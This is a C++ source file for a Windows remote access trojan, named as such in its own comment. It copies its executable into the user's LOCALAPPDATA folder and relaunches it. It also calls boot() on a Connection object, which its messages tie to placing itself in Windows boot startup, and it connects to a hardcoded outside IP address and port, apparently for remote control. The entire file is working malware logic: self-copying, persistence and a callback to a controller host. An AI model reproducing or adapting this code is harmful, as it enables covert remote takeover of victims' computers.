#include <iostream>
#include "Connection.h"


//Creating a new same RAT in C:\\C_projects\\test001.exe
bool moveFilePlace() {
    TCHAR szExeFileName[MAX_PATH];
    ::GetModuleFileNameA(NULL, szExeFileName, MAX_PATH);
    string fileName = "";
    for (auto chr : szExeFileName) {
        fileName += chr;
    }

    string path = getenv("LOCALAPPDATA");
    path += "\\test001.exe";

    if (!fileName.rfind("test001.exe")) {
        return false;
    }


    HANDLE hFileRead = ::CreateFileA(szExeFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                     OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hFileWrite = ::CreateFileA(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                      NULL,
                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    cout << "path is " << path << endl;
    if (hFileRead == INVALID_HANDLE_VALUE) {
        cout << "Cant open handle to the file" << endl;
        return false;
    } else if (hFileWrite == INVALID_HANDLE_VALUE) {
        cout << "Cant open handle to the file2" << endl;
        return false;
    }

    vector<char> buffer(BUFFER_SIZE + 1, 0);
    DWORD bytesRead = sizeof(bytesRead);
    while (bytesRead != 0) {
        ::ReadFile(hFileRead, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
        ::WriteFile(hFileWrite, buffer.data(), bytesRead, NULL, NULL);
    }
    CloseHandle(hFileWrite);
    CloseHandle(hFileRead);
    return true;
}


int main() {

    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);

    if (moveFilePlace()) {
        string path = getenv("LOCALAPPDATA");
        cout << "The command is " << "cd " + path + "&& start test001.exe" << endl;
        system(("cd " + path + "&& start test001.exe").c_str());
    } else {
        string ip = "141.226.121.68";
        int port = 9087;

        Connection *connection = new Connection(ip, port);
        BOOL success = connection->boot();
        if (success)
            connection->sendMessage("Can't place the exe in the windows boot startup");
        else
            connection->sendMessage("The exe is in windows boot startup");
        connection->connection();
    }
    return 0;
}
